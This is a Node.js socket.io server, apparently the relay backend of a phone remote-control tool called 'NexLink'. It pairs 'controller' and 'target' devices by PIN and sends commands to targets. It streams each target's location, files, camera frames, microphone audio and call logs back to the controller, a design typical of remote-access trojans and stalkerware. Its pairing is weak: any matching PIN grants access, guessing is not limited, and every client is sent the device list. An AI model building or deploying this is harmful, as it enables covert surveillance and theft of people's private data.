console.log("🔥 SERVER FILE LOADED");
const express = require("express");
const http = require("http");
const cors = require("cors");
const { Server } = require("socket.io");

const app = express();
app.use(cors());

// 🔥 Health check route (IMPORTANT for Render)
app.get("/", (req, res) => {
  res.send("NexLink Server Running ✅");
});

const server = http.createServer(app);

const io = new Server(server, {
  cors: {
    origin: "*",
    methods: ["GET", "POST"]
  },
  transports: ["websocket", "polling"], // 🔥 IMPORTANT FOR RENDER
  maxHttpBufferSize: 1e8
});

let devices = {};
let controllerMap = {};

// 🔐 Security (optional but kept)
let devicePins = {};
let verifiedControllers = {};

io.on("connection", (socket) => {

  console.log("🟢 Connected:", socket.id);

  /* ================= REGISTER ================= */
  socket.on("register-device", (data) => {

    devices[socket.id] = {
      id: socket.id,
      name: data.name,
      type: data.type,
    };

    console.log("📱 Registered:", data.name, data.type);

    // 🔐 Generate PIN for target
    if (data.type === "target") {
      const pin = Math.floor(100000 + Math.random() * 900000).toString();
      devicePins[socket.id] = pin;

      console.log("🔐 PIN:", pin);

      io.to(socket.id).emit("device-pin", { pin });
    }

    io.emit("device-list", Object.values(devices));
  });

  /* ================= VERIFY PIN ================= */
  socket.on("verify-pin", ({ pin }) => {

    const entry = Object.entries(devicePins)
      .find(([id, p]) => p === pin);

    if (!entry) {
      socket.emit("pin-status", { success: false });
      return;
    }

    const targetId = entry[0];
    verifiedControllers[socket.id] = targetId;

    socket.emit("pin-status", {
      success: true,
      targetId
    });

    console.log("✅ Verified:", socket.id);
  });

  /* ================= COMMAND ================= */
  socket.on("send-command", (data) => {

  const targetId = data.targetId;

  // 🔐 CHECK PIN VERIFICATION
  const allowedTarget = verifiedControllers[socket.id];

  if (allowedTarget !== targetId) {
    console.log("❌ Not verified controller");
    return;
  }

  if (!devices[targetId]) {
    console.log("❌ Target not found");
    return;
  }

  controllerMap[targetId] = socket.id;

  console.log("✅ Command routed:", targetId);

  io.to(targetId).emit("receive-command", data.command);
});
  /* ================= LOCATION ================= */
  socket.on("location-data", (data) => {

    const controller = controllerMap[socket.id];

    if (controller) {
      io.to(controller).emit("location-data", data);
    }
  });

  /* ================= DEVICE INFO ================= */
  socket.on("device-info", (data) => {

    const controller = controllerMap[socket.id];

    if (controller) {
      io.to(controller).emit("device-info", data);
    }
  });

  /* ================= FILES ================= */
  socket.on("file-list", (data) => {

    const controller = controllerMap[socket.id];

    if (controller) {
      io.to(controller).emit("file-list", data);
    }
  });

  socket.on("file-download", (data) => {

    const controller = controllerMap[socket.id];

    if (controller) {
      io.to(controller).emit("file-download", data);
    }
  });

  /* ================= CAMERA ================= */
  socket.on("camera-frame", (data) => {

    const controller = controllerMap[socket.id];

    if (controller) {
      io.to(controller).emit("camera-frame", data);
    }
  });

  /* ================= MIC ================= */
  socket.on("mic-audio", (data) => {

    const controller = controllerMap[socket.id];

    if (controller) {
      io.to(controller).emit("mic-audio", data);
    }
  });

  /* ================= CALL LOGS ================= */
  socket.on("call-logs", (logs) => {

    console.log("📞 Call logs received:", logs.length);

    const controller = controllerMap[socket.id];

    if (controller) {
      io.to(controller).emit("call-logs", logs);
    }
  });

  /* ================= DISCONNECT ================= */
  socket.on("disconnect", () => {

    console.log("🔴 Disconnected:", socket.id);

    delete devices[socket.id];
    delete controllerMap[socket.id];
    delete devicePins[socket.id];
    delete verifiedControllers[socket.id];

    io.emit("device-list", Object.values(devices));
  });

});

const PORT = process.env.PORT || 3000;

server.listen(PORT, () => {
  console.log("🚀 Server running on port", PORT);
});